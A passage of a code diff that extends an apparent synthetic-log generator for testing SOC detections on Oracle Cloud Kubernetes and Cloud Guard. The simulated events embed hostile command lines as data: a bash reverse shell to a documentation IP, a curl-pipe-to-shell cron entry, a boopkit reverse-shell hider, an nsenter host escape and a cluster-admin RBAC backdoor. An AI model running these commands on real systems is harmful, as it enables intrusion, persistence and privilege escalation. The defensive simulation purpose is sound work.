+            "parent": "span_oke_boopkit_ebpf_load",
+            "host": "oke-worker-01",
+            "workflow_step": "c2-traffic-hide",
+            "command": "boopkit --hide-port 443 --reverse-shell /bin/sh",
+            "attributes": "boopkit reverse-shell hidden-port ebpf traffic hide",
+        },
+        {
+            "stage": "cronjob_persistence",
+            "message": "Kubernetes CronJob persistence created to relaunch node diagnostic payload",
+            "severity": "high",
+            "technique_id": "T1053.007",
+            "technique": "Scheduled Task/Job: Container and Orchestration Job",
+            "url": "/apis/batch/v1/namespaces/kube-system/cronjobs/node-diag-refresh",
+            "method": "POST",
+            "status": "201",
+            "span": "span_oke_boopkit_cronjob_persistence",
+            "parent": "span_oke_boopkit_c2_hide",
+            "host": "oke-api-server",
+            "workflow_step": "persistence",
+            "command": "kubectl create cronjob node-diag-refresh --image=registry.example.test/node-diag:latest",
+            "attributes": "k8s.audit.verb=create k8s.resource=cronjobs persistence daemonset relaunch",
+        },
+        {
+            "stage": "rbac_backdoor",
+            "message": "ClusterRoleBinding granted cluster-admin to workload service account",
+            "severity": "critical",
+            "technique_id": "T1098",
+            "technique": "Account Manipulation",
+            "url": "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings/node-diag-admin",
+            "method": "POST",
+            "status": "201",
+            "span": "span_oke_boopkit_rbac_backdoor",
+            "parent": "span_oke_boopkit_cronjob_persistence",
+            "host": "oke-api-server",
+            "workflow_step": "rbac-backdoor",
+            "command": "kubectl create clusterrolebinding node-diag-admin --clusterrole=cluster-admin --serviceaccount=kube-system:node-diag-agent",
+            "attributes": "k8s.audit.verb=create k8s.resource=clusterrolebindings cluster-admin serviceaccount backdoor",
+        },
+    ]
+
+    events = []
+    for offset, stage in enumerate(stages, start=112):
+        base_event = application_event(
+            "octo-apm-demo",
+            message=stage["message"],
+            level="ERROR" if stage["severity"] in {"critical", "high"} else "WARN",
+            url=stage["url"],
+            http_method=stage["method"],
+            status_code=stage["status"],
+            response_time_ms=640 + (offset - 112) * 180,
+            client_ip=actor_ip,
+            user_agent="kubectl/v1.29 oci-oke-demo",
+            user="system:serviceaccount:kube-system:node-diag-agent",
+            trace_id=attack_trace,
+            span_id=stage["span"],
+            parent_span_id=stage["parent"],
+            span_name=f"oke.attack.{stage['stage']}",
+            span_attributes=stage["attributes"],
+            error_type=stage["stage"] if stage["severity"] in {"critical", "high"} else None,
+            slow_request=stage["severity"] == "critical",
+            workflow_id="oke-kubernetes-attack-simulation",
+            workflow_step=stage["workflow_step"],
+            request_id=request_id,
+            run_id=run_id,
+            hostname=stage["host"],
+            metric_name="oke.security.attack.event",
+            metric_value="1",
+            metric_unit="count",
+            offset=offset,
+        )
+        events.append({
+            **base_event,
+            "security.attack.id": attack_id,
+            "security.attack.stage": stage["stage"],
+            "security.attack.type": "oke_kubernetes_attack",
+            "security.attack.detected": True,
+            "security.severity": stage["severity"],
+            "mitre.tactic": "Defense Evasion" if "boopkit" in stage["stage"] else "Privilege Escalation",
+            "mitre.technique_id": stage["technique_id"],
+            "mitre.technique": stage["technique"],
+            "source.ip": actor_ip,
+            "host.name": stage["host"],
+            "host.role": "oke-control-plane" if stage["host"] == "oke-api-server" else "oke-worker",
+            "process.command_line": stage["command"],
+            "kubernetes.cluster.name": "oke-demo-cluster",
+            "kubernetes.namespace": "kube-system" if "kube-system" in stage["url"] else "prod",
+            "kubernetes.audit.verb": "create" if stage["method"] == "POST" else "get",
+            "kubernetes.audit.uri": stage["url"],
+        })
+    return events
+
+
+def generate_cloud_guard_instance_security_events():
+    """Generate Cloud Guard Instance Security / OSQuery result-log findings."""
+    base = BASE_TIME + timedelta(minutes=720)
+    packs = [
+        (
+            "baseline-linux",
+            "world_writable_paths",
+            "World-writable directory in sensitive path",
+            "SELECT path, mode FROM file WHERE path IN ('/tmp', '/var/tmp');",
+            "World-writable path /tmp has unexpected executable payload",
+            "high",
+            "T1222",
+            "File and Directory Permissions Modification",
+            "/tmp/boopkit",
+            "chmod 777 /tmp/boopkit",
+        ),
+        (
+            "persistence",
+            "suspicious_cron_entries",
+            "Suspicious cron persistence",
+            "SELECT command FROM crontab WHERE command LIKE '%curl%';",
+            "Cron entry relaunches node diagnostic payload",
+            "high",
+            "T1053.003",
+            "Cron",
+            "/etc/cron.d/node-diag",
+            "curl -fsS https://updates.example.test/node.sh | sh",
+        ),
+        (
+            "network-exposure",
+            "unexpected_listeners",
+            "Unexpected listening process",
+            "SELECT pid, port, protocol FROM listening_ports;",
+            "Process bash opened listener on 0.0.0.0:4444",
+            "critical",
+            "T1095",
+            "Non-Application Layer Protocol",
+            "/proc/4444/exe",
+            "bash -i >& /dev/tcp/198.51.100.77/4444 0>&1",
+        ),
+        (
+            "container-oke-host",
+            "host_namespace_processes",
+            "Container process entered host namespace",
+            "SELECT pid, cmdline FROM processes WHERE cmdline LIKE '%nsenter%';",
+            "Privileged diagnostic pod entered host namespace",
+            "critical",
+            "T1611",
+            "Escape to Host",
+            "/usr/bin/nsenter",
+            "nsenter -t 1 -m -u -i -n sh",
+        ),
+    ]
+    events = []
+    for index, (
+        pack_name,
+        query_id,
+        finding_name,
+        sql,
+        finding,
+        severity,
+        technique_id,
+        technique,
+        file_path,
+        command,
+    ) in enumerate(packs, start=1):
+        timestamp = (base + timedelta(minutes=index)).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
+        host = "oke-worker-01" if "container" in pack_name or query_id == "unexpected_listeners" else "app-prod-02"
+        events.append({
+            "timestamp": timestamp,
+            "message": finding,
+            "hostname": host,
+            "instanceOcid": f"ocid1.instance.oc1..examplecgis{index:02d}",
+            "cloud.instance.id": f"ocid1.instance.oc1..examplecgis{index:02d}",
+            "region": "us-ashburn-1",
+            "riskLevel": severity.upper(),
+            "severity": severity,
+            "status": "open",
+            "findingId": f"finding-cgis-{index:03d}",
+            "findingName": finding_name,
+            "problemId": f"cgis-problem-{index:03d}",
+            "ruleId": f"cgis-rule-{query_id}",
+            "pack": {
+                "name": pack_name,
+                "query_id": query_id,
+                "query_name": finding_name,
+            },
+            "osquery": {
+                "query": query_id,
+                "sql": sql,
+                "finding": finding,
+                "result_count": 1,
+            },
+            "process": {
+                "name": command.split()[0],
+                "command_line": command,
+            },
+            "file": {"path": file_path},
+            "source": {"ip": "10.0.10.42"},
+            "destination": {"ip": "198.51.100.77", "port": 4444},
+            "mitre": {
+                "tactic": "Defense Evasion" if severity == "critical" else "Persistence",
+                "technique_id": technique_id,
+                "technique": technique,
+            },
+            "logType": "cloud_guard_instance_security",
+        })
     return events
 
 
@@ -6625,12 +7435,15 @@ def main():
     # Generate events — original SOC detection rule sources
     oci_events = generate_oci_audit_events()
     cg_events = generate_cloud_guard_events()
+    cgis_events = generate_cloud_guard_instance_security_events()
     linux_events = generate_linux_events()
     windows_events = generate_windows_events()
 
     # Generate events — multicloudoperations widget-compatible sources
     winsec_events = generate_windows_event_security()
     winsys_events = generate_windows_event_system()
+    winps_events = generate_windows_powershell_operational()
+    windef_events = generate_windows_defender_operational()
     linsec_events = generate_linux_secure()
     sysmon_events = generate_sysmon_operational()
 
@@ -6648,10 +7461,13 @@ def main():
     generated_sets = {
         "oci_audit.jsonl": oci_events,
         "cloud_guard.jsonl": cg_events,
+        "cloud_guard_instance_security.jsonl": cgis_events,
         "linux_syslog.jsonl": linux_events,
         "windows_sysmon.jsonl": windows_events,
         "windows_event_security.jsonl": winsec_events,
         "windows_event_system.jsonl": winsys_events,
+        "windows_powershell_operational.jsonl": winps_events,
+        "windows_defender_operational.jsonl": windef_events,
         "linux_secure.jsonl": linsec_events,
         "sysmon_operational.jsonl": sysmon_events,
         "sysmon_network.jsonl": sysmon_net_events,
